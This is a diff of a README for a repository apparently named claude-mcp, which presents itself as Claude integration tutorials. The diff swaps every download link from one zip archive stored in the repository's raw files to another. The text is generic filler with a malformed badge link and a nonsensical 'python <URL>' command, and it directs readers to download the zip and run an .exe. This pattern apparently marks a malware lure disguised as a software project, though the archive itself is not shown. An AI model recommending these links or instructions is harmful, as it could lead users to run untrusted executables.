@@ -1,7 +1,7 @@
 # 🌟 claude-mcp - Simple Guides for Integration Examples
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/mcp-claude-1.1.zip%20Latest%https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/mcp-claude-1.1.zip)](https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/mcp-claude-1.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/claude_mcp_3.3.zip%20Latest%https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/claude_mcp_3.3.zip)](https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/claude_mcp_3.3.zip)
 
 ## 📖 Overview
 The **claude-mcp** project provides examples and tutorials for integrating the Claude model with various applications. Whether you are looking to enhance your projects or learn more about machine learning integrations, this repository is your go-to resource.
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page**  
-   Visit the following page to download the latest version of the software: [Download Here](https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/mcp-claude-1.1.zip)  
+   Visit the following page to download the latest version of the software: [Download Here](https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/claude_mcp_3.3.zip)  
    
 2. **Select the Release**  
    On the releases page, you will see a list of versions. Click on the latest version to view more details.
@@ -32,7 +32,7 @@ Before you begin, ensure your system meets the following requirements:
 
 5. **Run the Application**  
    - For Windows users, find the `.exe` file in the extracted folder and double-click to run it.  
-   - For Mac or Linux, open your terminal, navigate to the folder, and run the application using the command `python https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/mcp-claude-1.1.zip`, replacing `https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/mcp-claude-1.1.zip` with the appropriate file name.
+   - For Mac or Linux, open your terminal, navigate to the folder, and run the application using the command `python https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/claude_mcp_3.3.zip`, replacing `https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/claude_mcp_3.3.zip` with the appropriate file name.
 
 6. **Follow the Tutorials**  
    Inside the extracted folder, you will find several tutorials in the form of documentation. These guides will help you through various examples and explain how to use the integration effectively.
@@ -67,6 +67,6 @@ This project includes discussions and examples related to:
 - tutorial
 
 ## 📅 Updates
-Stay informed about new features and updates by regularly checking the releases page: [Download Here](https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/mcp-claude-1.1.zip)  
+Stay informed about new features and updates by regularly checking the releases page: [Download Here](https://raw.githubusercontent.com/proextreme2/claude-mcp/main/claude_mcp/claude_mcp_3.3.zip)  
 
 Thank you for exploring the **claude-mcp** project. We hope you find it helpful for your integration needs!
